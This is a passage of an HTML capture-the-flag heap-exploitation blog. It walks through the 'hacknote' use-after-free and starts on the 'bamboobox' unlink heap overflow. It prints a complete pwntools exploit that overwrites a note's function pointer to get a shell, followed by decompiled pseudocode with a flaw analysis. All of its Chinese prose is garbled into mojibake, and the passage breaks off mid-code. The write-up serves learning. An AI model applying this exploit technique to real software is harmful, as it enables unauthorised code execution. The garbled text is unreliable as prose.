†ï¼Œä¸¤ä¸ªnoteç»“æ„ä½“ï¼Œä¸¤ä¸ªcontentéƒ¨åˆ†<br>noteç»“æ„ä½“çš„å¤§å°ä½äº0x10çš„fastbinï¼Œè€Œcontenéƒ¨åˆ†ä½äº0x18å¤„</p><pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/9.jpg" alt=""><br>æ¥ä¸‹æ¥æˆ‘ä»¬å†mallocä¸€ä¸ªå¤§å°ä¸º8çš„å †(2å·å †)ï¼Œå¹¶ä¸”å°†å…¶contentèµ‹å€¼ä¸ºmagicçš„åœ°å€ï¼Œæ ¹æ®fastbinåè¿›å…ˆå‡ºçš„åŸåˆ™,2å·å †çš„noteç»“æ„ä½“å°±ä½äº1å·å †çš„noteç»“æ„ä½“å¤„ï¼Œcontentåˆ™ä½äº0å·å †çš„noteç»“æ„ä½“ä½ç½®</p><pre><code>               â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”               |                                |               |         content2(åŸnote0)      |               |                                |               |--------------------------------|               |                                |               |         content0(freed)        |               |                                |               |--------------------------------|               |                                |               |         note2(åŸnote1)         |               |                                |               |--------------------------------|               |                                |               |         content0(freed)        |               |                                |               â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</code></pre><p>æˆ‘ä»¬çœ‹çœ‹æ­¤æ—¶çš„å †ç»“æ„<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/10.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°ï¼ŒåŸæœ¬note0ä¸­çš„print_note_contentå‡½æ•°æŒ‡é’ˆå·²ç»è¢«æ›¿æ¢æˆäº†magicå‡½æ•°åœ°å€ï¼Œåªè¦æˆ‘ä»¬printnote(0)ï¼Œå°±ç›¸å½“äºè°ƒç”¨äº†magicå‡½æ•°ï¼Œå³å¯getshell<br>å®Œæ•´expå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",29741)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'hacknote'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>magic <span class="token operator">=</span> <span class="token number">0x08048945</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h3><p>å°±ä¸ç»†è¯´unlinkçš„åŸç†äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå¸ˆå‚…çš„åšå®¢å¯ä»¥çœ‹ï¼Œç›´æ¥è¯´åˆ©ç”¨æ–¹æ³•<br>ä¼ªé€ ä¸€ä¸ªfakechunk0ï¼Œä½¿fakechunk0çš„fdæŒ‡é’ˆä¸º<code>&amp;ptr-0x18</code>,ä½¿å…¶bkä¸º<code>&amp;ptr-0x10</code>,å¹¶é€šè¿‡å †æº¢å‡ºä½¿ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †chunk1è®¤ä¸ºä¸Šä¸€ä¸ªå †æ˜¯ç©ºé—²çŠ¶æ€ã€‚æ„é€ å¥½ä¹‹åï¼Œå†freeæ‰chunk1ï¼Œæ ¹æ®unlinkåŸç†ï¼Œfakechunkä¹Ÿä¼šä¸€èµ·è¢«freeæ‰ï¼Œæ”»å‡»æ•ˆæœæ˜¯ptræœ€ç»ˆæŒ‡å‘äº†<code>&amp;ptr-0x18</code>å¤„</p><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/11.jpg" alt=""><br>64ä½ï¼Œåªå¼€å¯äº†canaryå’Œnxï¼Œæˆ‘ä»¬å¯ä»¥å¤å†™gotè¡¨<br>è¿è¡Œä¸€ä¸‹ï¼ŒæŸ¥çœ‹åŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/12.jpg" alt=""><br>å¢åˆ æŸ¥æ”¹ï¼ŒåŠŸèƒ½é½äº†<br>IDAåˆ†æ </p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  _QWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span>v3 <span class="token operator">=</span> hello_message<span class="token punctuation">;</span>  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> goodbye_message<span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">,</span> _QWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">add_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token function">change_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild choice!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>mainå‡½æ•°é‡Œé¢ä¼šå…ˆmallocä¸€ä¸ª0x10å¤§å°(å®é™…ä¸Š0x20)çš„chunkç”¨æ¥å­˜æ”¾ä¸¤ä¸ªå‡½æ•°çš„æŒ‡é’ˆï¼Œè¿™æ²¡å•¥ç”¨<br>ç„¶åé€šè¿‡switché€‰æ‹©åŠŸèƒ½</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_item</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">></span> <span class="token number">99</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"the box is full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v2 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild length"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the name of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">++</span>num<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>ä¸å¾—ä¸è¯´ä¼ªä»£ç çœ‹çš„è¿˜æ˜¯ç›¸å½“è®©äººå¤´å¤§çš„<br>æœ€å¤§èƒ½add100æ¬¡ï¼Œæœ‰ä¸€ä¸ªitemlistç»“æ„ä½“ï¼Œç»“æ„å¦‚ä¸‹</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> item<span class="token punctuation">{</span>    <span class="token keyword">int</span> size <span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>name <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>ä¸ºäº†é˜²æ­¢ä»¥åé—å¿˜ä»”ç»†è®°å½•ä¸€æ¬¡<br>intæ˜¯4ä¸ªå­—èŠ‚</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre><p>è¿™ä¸€å¥åˆ¤æ–­åˆ¤æ–­çš„æ˜¯itemç»“æ„ä½“ä¸­nameæŒ‡é’ˆæ˜¯å¦å­˜åœ¨ï¼Œé‚£ä¹ˆnameæŒ‡é’ˆçš„ä½ç½®åˆæ˜¯æ€ä¹ˆç¡®å®šçš„ï¼Œç»“åˆé¢˜ç›®è¯´æ˜ä¸€ä¸‹</p><pre class=" language-bash"><code class="language-bash">0x6020c0 <span class="token operator">&lt;</span>itemlist<span class="token operator">></span>:    0x0000000000000018  0x00000000006030300x6020d0 <span class="token operator">&lt;</span>itemlist+16<span class="token operator">></span>: 0x0000000000000018  0x00000000006030500x6020e0 <span class="token operator">&lt;</span>itemlist+32<span class="token operator">></span>: 0x0000000000000000  0x00000000000000000x6020f0 <span class="token operator">&lt;</span>itemlist+48<span class="token operator">></span>: 0x0000000000000000  0x00000000000000000x602100 <span class="token operator">&lt;</span>itemlist+64<span class="token operator">></span>: 0x0000000000000000  0x0000000000000000</code></pre><p>64ä½ç¨‹åºï¼Œè¿™ä¹ˆä¸€è¡Œå°±æ˜¯16ä¸ªå­—èŠ‚ï¼Œç›¸å½“äº4ä¸ªint,å‡è®¾i=0<br>é‚£ä¹ˆï¼Œitemlist[i]å°±æ˜¯<code>00000018</code>è¿™å››ä¸ªå­—èŠ‚ï¼Œitemlist[i+1]å°±æ˜¯<code>00000018</code>å‰æ–¹çš„<code>00000000</code>è¿™å››ä¸ªå­—èŠ‚ï¼Œç›¸åº”çš„ï¼Œitemlist[i+2]å°±æ˜¯<code>00603030</code>è¿™å››ä¸ªå­—èŠ‚ï¼Œå¯¹åº”çš„å°±æ˜¯nameæŒ‡é’ˆ</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//show_item</span><span class="token keyword">int</span> <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>num <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d : %s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>byte_401089<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>showåŠŸèƒ½æ ¹æ®numç´¢å¼•å¯»æ‰¾å¯¹åº”çš„chunkï¼Œç„¶åè¾“å‡ºå¯¹çš„chunkç¼–å·å’Œå†…å®¹</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//change</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v0 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the new name of the item:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>é—®é¢˜å°±å‡ºåœ¨changeåŠŸèƒ½ä¸Š<br>è¾“å…¥nemeçš„é•¿åº¦çš„æ—¶å€™å¹¶æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å¤§äºä¹‹å‰çš„é•¿åº¦ï¼Œé€ æˆäº†å †æº¢å‡ºæ¼æ´</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//rmeove_item</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"remove successful!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">--</span>num<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token 